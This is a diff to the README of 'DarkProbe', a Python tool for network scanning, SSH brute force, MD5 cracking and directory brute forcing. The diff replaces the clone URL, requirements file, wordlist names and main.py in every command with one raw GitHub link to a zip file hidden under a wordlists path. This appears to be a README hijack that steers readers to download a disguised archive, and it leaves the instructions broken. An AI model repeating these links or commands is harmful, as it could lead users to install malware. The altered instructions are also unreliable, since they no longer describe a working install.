@@ -26,53 +26,53 @@
 
 1. Clone or download the repository:
    ```bash
-   git clone https://github.com/0xUnkn0wn4M1R/DarkProbe.git
+   git clone https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
    ```
 
 2. Install the required libraries:
    Navigate to the project folder and run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
    ```
 
 3. Place the necessary wordlists in the `wordlists` directory:
-   - `passwords.txt`: The password list for SSH brute force.
-   - `directories.txt`: The list of directories to try for directory brute forcing.
+   - `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip`: The password list for SSH brute force.
+   - `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip`: The list of directories to try for directory brute forcing.
 
 ## Usage
 
-To run the tool, use the `main.py` file. The script will prompt the user for input and execute the corresponding security features. Here are the available modules:
+To run the tool, use the `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip` file. The script will prompt the user for input and execute the corresponding security features. Here are the available modules:
 
 ### Network Scan:
 Perform a network scan on a specific IP or host.
 ```bash
-python main.py -n <target-ip>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -n <target-ip>
 ```
 
 ### SSH Brute Force:
-Perform an SSH brute force attack on a target server using the `passwords.txt` wordlist.
+Perform an SSH brute force attack on a target server using the `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip` wordlist.
 ```bash
-python main.py -b <target-ip>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip>
 ```
 To specify a custom wordlist, use the `-w` flag:
 ```bash
-python main.py -b <target-ip> -w <custom_passwords.txt>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip> -w <https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip>
 ```
 
 ### Hash Cracking (MD5):
 Crack an MD5 hash to reveal the original password.
 ```bash
-python main.py -H <md5_hash>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -H <md5_hash>
 ```
 
 ### Directory Brute Force:
 Perform a directory brute force attack on a website.
 ```bash
-python main.py -d <website-url>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url>
 ```
 To specify a custom directory wordlist, use the `-w` flag:
 ```bash
-python main.py -d <website-url> -w <custom_directories.txt>
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url> -w <https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip>
 ```
 
 ## Ethical Usage Guidelines
@@ -96,8 +96,8 @@ Here are the flags you can use with the **DarkProbe** tool:
 
 Example usage:
 ```bash
-python main.py -b <target-ip> -w custom_passwords.txt
-python main.py -d <website-url> -w custom_directories.txt
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip> -w https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url> -w https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
 ```
 
 ## Contributing
